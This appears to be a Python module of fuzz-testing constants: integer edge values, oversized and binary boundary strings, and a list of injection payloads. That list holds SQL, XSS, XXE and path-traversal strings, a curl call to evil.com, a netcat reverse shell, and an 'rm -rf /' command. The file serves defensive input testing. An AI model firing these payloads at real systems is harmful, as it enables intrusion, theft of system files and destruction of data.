SPECIAL_INTS: list[int] = list({
    # 32-bit specific edge cases
    0xFFFFFFFF,  # Max unsigned 32-bit integer (2^32 - 1)
    0x7FFFFFFF,  # Max signed 32-bit integer (2^31 - 1)
    0x80000000,  # Min signed 32-bit integer (-2^31)

    # 64-bit specific edge cases
    0xFFFFFFFFFFFFFFFF,  # Max unsigned 64-bit integer (2^64 - 1)
    0x7FFFFFFFFFFFFFFF,  # Max signed 64-bit integer (2^63 - 1)
    0x8000000000000000,  # Min signed 64-bit integer (-2^63)
    # Edge case values
    0,  # Zero
    -1,  # Negative one
    1,  # Positive one

    # Large numbers near the limits of 32-bit integers
    0xFFFFFFFE,  # Just below UINT_MAX for 32-bit
    0x7FFFFFFE,  # Just below INT_MAX for 32-bit

    # Large numbers near the limits of 64-bit integers
    0xFFFFFFFFFFFFFFFE,  # Just below UINT_MAX for 64-bit
    0x7FFFFFFFFFFFFFFE,  # Just below INT_MAX for 64-bit

    # Powers of 2 for 32-bit integers
    *(2 ** i for i in range(1, 64)),

    # Negative powers of 2 for 32-bit integers
    *(-(2 ** i) for i in range(1, 64)),

    # Random special numbers
    314159265,  # Pi approximation
    271828182,  # e approximation
    42,  # The answer to life, universe, and everything
    1337,  # Hacker number
    9001,  # Over 9000!
})

# Define special character values as integers for boundary and edge case testing
SPECIAL_CHAR_INTS = [0x00, 0xFF, 0x7F, 0x80]

# Define boundary values in string form for testing in text-based fields
BOUNDARY_CHAR_STRINGS = ["\x00", "\xFF", "\x7F", "\x80"]



SPECIAL_POSITIVE_INTS = [i for i in SPECIAL_INTS if i > 0]
TRIVAL_POSITIVE_INTS = list({
    2 ** 16
})


INJECTION_PAYLOADS = [
    # SQL Injection-like Payloads
    "'; DROP TABLE users; --",           # Simple SQL injection
    "' OR '1'='1",                       # Bypass authentication with tautology
    "' UNION SELECT NULL, NULL, NULL --", # SQL injection with UNION
    "'; EXEC xp_cmdshell('dir'); --",    # SQL injection with command execution (SQL Server)

    # XSS Injection Payloads
    "<script>alert('XSS')</script>",      # Basic XSS payload
    "<img src=x onerror=alert(1)>",       # Image-based XSS
    "<svg/onload=alert('XSS')>",          # SVG-based XSS
    "<iframe src='javascript:alert(1)'></iframe>",  # iframe-based XSS
    "' onmouseover='alert(1)",            # Inline attribute-based XSS

    # Command Injection Payloads
    "|| ls -la ||",                       # Command injection (Linux)
    "`rm -rf /`",                         # Command injection (Linux)
    "$(curl http://evil.com)",            # Command injection with network call
    "; ping -c 4 127.0.0.1;",             # Ping command to test for remote execution
    "| nc -e /bin/sh 127.0.0.1 4444 |",   # Netcat reverse shell

    # Path Traversal Payloads
    "../../etc/passwd",                   # Path traversal to sensitive file
    "..\\..\\windows\\system32\\drivers\\etc\\hosts", # Windows path traversal
    "/etc/shadow",                        # Direct path to a sensitive file (Linux)
    "C:\\boot.ini",                       # Windows system file access
    "/proc/self/environ",                 # Linux environment variables access

    # XML-Specific and Encoded Payloads
    "&#x27;",                             # HTML entity encoding for single quote
    "&lt;script&gt;alert('XSS')&lt;/script&gt;", # Encoded XSS script
    "<![CDATA[<script>alert('XSS')</script>]]>", # CDATA XSS payload
    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",  # XXE Payload
    "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>", # XXE with sensitive file
    "%3Cscript%3Ealert('XSS')%3C/script%3E", # URL-encoded XSS

    # Additional Obfuscation and Encoding
    "%00%ff%fe",                          # Null byte and binary data
    "<!--#exec cmd=\"/bin/sh\"-->",       # Server-side include command execution
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;", # Hexadecimal encoded XSS
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # JavaScript-style hexadecimal escape sequences
    "中文测试",                            # Unicode characters to test encoding support
    "𠜎𠜱𠝹𠱓",                           # Extended Unicode characters to test UTF-8 support
]


BOUNDARY_VALUES = [
    "",                                  # Empty string
    "A" * 1024,                          # Large string to test buffer limits
    "A" * 65536,                         # Extremely large string for memory handling
    "\x00",                              # Null byte (often terminates strings in C-based languages)
    "\xFF\xFE",                          # Edge of ASCII/Unicode range, binary data
    "\x00\xFF\xFE",                      # Combination of binary edge values
    " " * 1024,                          # Large string of spaces
    "A" * 10**6,                         # Extremely large string (1 million characters)
    "-1",                                # Negative number for numeric boundary tests
    "0",                                 # Zero boundary value
    "1",                                 # Smallest positive integer
    str(2**31 - 1),                      # Max 32-bit integer
    str(2**31),                          # Overflow 32-bit signed integer
    str(2**63 - 1),                      # Max 64-bit integer
    str(2**63),                          # Overflow 64-bit signed integer
    "-2147483648",                       # Minimum 32-bit integer
    "-9223372036854775808",              # Minimum 64-bit integer
    "9" * 308,                           # Large floating-point number (close to float max)
    "-9" * 308,                          # Large negative floating-point number
    "1e308",                             # Exponentially large float (near limit of double)
    "1e-308",                            # Very small float (near limit of double precision)
    "%20",                               # URL encoded space
    "%00%FF",                            # URL encoded null and max byte
    "中文测试",                            # Non-ASCII Unicode characters
    "𠜎𠜱𠝹𠱓",                           # Extended Unicode characters (UTF-8)
    "!" * 512,                           # Large string of special characters
    "\\x00\\x01\\x02",                   # Escaped hexadecimal characters
    "<tag>value</tag>",                  # XML-like structure to test XML injection
    "DROP TABLE users;",                 # SQL-like payload to test for injection handling
]
